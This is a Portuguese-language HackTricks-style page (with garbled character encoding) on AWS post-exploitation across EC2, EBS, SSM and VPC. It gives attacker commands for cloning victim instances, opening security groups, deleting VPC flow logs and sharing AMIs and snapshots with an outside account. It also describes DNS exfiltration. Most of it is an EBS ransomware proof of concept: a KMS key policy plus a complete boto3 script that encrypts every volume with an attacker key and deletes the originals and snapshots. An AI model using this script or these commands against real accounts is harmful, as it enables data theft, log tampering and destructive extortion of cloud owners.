# AWS - EC2, EBS, SSM & VPC P√≥s-Explora√ß√£o

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## EC2 & VPC

Para mais informa√ß√µes, confira:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **Espelho Malicioso de VPC**

O espelhamento de tr√°fego de VPC **duplica o tr√°fego de entrada e sa√≠da para inst√¢ncias EC2 dentro de um VPC** sem a necessidade de instalar nada nas pr√≥prias inst√¢ncias. Esse tr√°fego duplicado normalmente seria enviado para algo como um sistema de detec√ß√£o de intrus√£o de rede (IDS) para an√°lise e monitoramento.\
Um atacante poderia abusar disso para capturar todo o tr√°fego e obter informa√ß√µes sens√≠veis dele:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### Copiar Inst√¢ncia em Execu√ß√£o

Inst√¢ncias geralmente cont√™m algum tipo de informa√ß√£o sens√≠vel. Existem diferentes maneiras de acess√°-las (confira [t√©cnicas de escalonamento de privil√©gios do EC2](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)). No entanto, outra maneira de verificar o que cont√©m √© **criar uma AMI e executar uma nova inst√¢ncia (at√© mesmo na sua pr√≥pria conta) a partir dela**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### Dump de Snapshot EBS

**Snapshots s√£o backups de volumes**, que geralmente cont√™m **informa√ß√µes sens√≠veis**, portanto, verific√°-los deve revelar essas informa√ß√µes.\
Se voc√™ encontrar um **volume sem um snapshot**, voc√™ poderia: **Criar um snapshot** e realizar as seguintes a√ß√µes ou simplesmente **mont√°-lo em uma inst√¢ncia** dentro da conta:

{% content-ref url="../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Exfiltra√ß√£o de Dados

#### Exfiltra√ß√£o via DNS

Mesmo que voc√™ restrinja um EC2 para que nenhum tr√°fego possa sair, ele ainda pode **exfiltrar via DNS**.

* **VPC Flow Logs n√£o registrar√£o isso**.
* Voc√™ n√£o tem acesso aos logs de DNS da AWS.
*   Desative isso definindo "enableDnsSupport" como falso com:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltra√ß√£o via chamadas de API

Um atacante poderia chamar endpoints de API de uma conta controlada por ele. O Cloudtrail registrar√° essas chamadas e o atacante poder√° ver os dados exfiltrados nos logs do Cloudtrail.

### Grupo de Seguran√ßa Aberto

Voc√™ poderia obter acesso adicional a servi√ßos de rede abrindo portas assim:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### P√≥s-Explora√ß√£o SSM

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md" %}
[aws-ssm-post-exploitation.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md)
{% endcontent-ref %}

### Escalonamento de Privil√©gios para ECS

√â poss√≠vel executar uma inst√¢ncia EC2 e registr√°-la para ser usada na execu√ß√£o de inst√¢ncias ECS e, em seguida, roubar os dados das inst√¢ncias ECS.

Para [**mais informa√ß√µes, verifique isto**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### Remover logs de fluxo do VPC
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### Compartilhar AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Compartilhar Snapshot EBS

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
```markdown
### EBS Ransomware PoC
Uma prova de conceito semelhante √† demonstra√ß√£o de Ransomware mostrada nas notas de p√≥s-explora√ß√£o do S3. KMS deveria ser renomeado para RMS, de Ransomware Management Service, pela facilidade com que √© poss√≠vel usar para criptografar v√°rios servi√ßos da AWS com ele.

Primeiro, de uma conta AWS 'atacante', crie uma chave gerenciada pelo cliente no KMS. Para este exemplo, vamos permitir que a AWS gerencie os dados da chave para mim, mas em um cen√°rio realista, um ator malicioso reteria os dados da chave fora do controle da AWS. Altere a pol√≠tica da chave para permitir que qualquer conta AWS Principal use a chave. Para esta pol√≠tica de chave, o nome da conta era 'AttackSim' e a regra da pol√≠tica que permite todo o acesso √© chamada de 'Outside Encryption'
```
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
A regra da pol√≠tica de chave precisa ter o seguinte habilitado para permitir a capacidade de us√°-la para criptografar um volume EBS:
- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Agora, com a chave publicamente acess√≠vel para usar. Podemos usar uma conta 'v√≠tima' que tenha algumas inst√¢ncias EC2 ativadas com volumes EBS n√£o criptografados anexados. Os volumes EBS da conta 'v√≠tima' s√£o o que estamos visando para criptografia, esse ataque est√° sob a suposi√ß√£o de viola√ß√£o de uma conta AWS de alto privil√©gio.

<img width="731" alt="Pasted image 20231231172655" src="https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6">
<img width="708" alt="Pasted image 20231231172734" src="https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459">

Semelhante ao exemplo de ransomware S3. Este ataque criar√° c√≥pias dos volumes EBS anexados usando snapshots, usar√° a chave publicamente dispon√≠vel da conta do 'atacante' para criptografar os novos volumes EBS, depois desanexar√° os volumes EBS originais das inst√¢ncias EC2 e os deletar√°, e ent√£o finalmente deletar√° os snapshots usados para criar os novos volumes EBS criptografados.
![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Isso resulta em apenas volumes EBS criptografados dispon√≠veis na conta.

<img width="729" alt="Pasted image 20231231173338" src="https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220">

Tamb√©m vale a pena notar, o script parou as inst√¢ncias EC2 para desanexar e deletar os volumes EBS originais. Os volumes originais n√£o criptografados agora se foram.

<img width="736" alt="Pasted image 20231231173931" src="https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e">

Em seguida, retorne √† pol√≠tica de chave na conta do 'atacante' e remova a regra de pol√≠tica 'Outside Encryption' da pol√≠tica de chave.
```{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Aguarde um momento para que a nova pol√≠tica de chave se propague. Em seguida, volte para a conta 'v√≠tima' e tente anexar um dos novos volumes EBS criptografados. Voc√™ ver√° que pode anexar o volume.

<img width="408" alt="Pasted image 20231231174131" src="https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47">
<img width="721" alt="Pasted image 20231231174258" src="https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4">

Mas quando voc√™ tenta realmente iniciar a inst√¢ncia EC2 novamente com o volume EBS criptografado, ela simplesmente falhar√° e voltar√° do estado 'pendente' para o estado 'parado' indefinidamente, j√° que o volume EBS anexado n√£o pode ser descriptografado usando a chave, pois a pol√≠tica de chave n√£o permite mais isso.

<img width="532" alt="Pasted image 20231231174322" src="https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514">
<img width="501" alt="Pasted image 20231231174352" src="https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0">

Este √© o script python utilizado. Ele recebe as credenciais AWS para uma conta 'v√≠tima' e um valor ARN AWS publicamente dispon√≠vel para a chave a ser usada para criptografia. O script far√° c√≥pias criptografadas de TODOS os volumes EBS dispon√≠veis anexados a TODAS as inst√¢ncias EC2 na conta AWS alvo, depois parar√° cada inst√¢ncia EC2, desanexar√° os volumes EBS originais, os deletar√° e, finalmente, deletar√° todos os snapshots utilizados durante o processo. Isso deixar√° apenas volumes EBS criptografados na conta 'v√≠tima' alvo. USE ESTE SCRIPT APENAS EM UM AMBIENTE DE TESTE, ELE √â DESTRUTIVO E DELETAR√Å TODOS OS VOLUMES EBS ORIGINAIS. Voc√™ pode recuper√°-los usando a chave KMS utilizada e restaur√°-los ao seu estado original por meio de snapshots, mas quero apenas que voc√™ esteja ciente de que isso √© um PoC de ransomware no final das contas.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
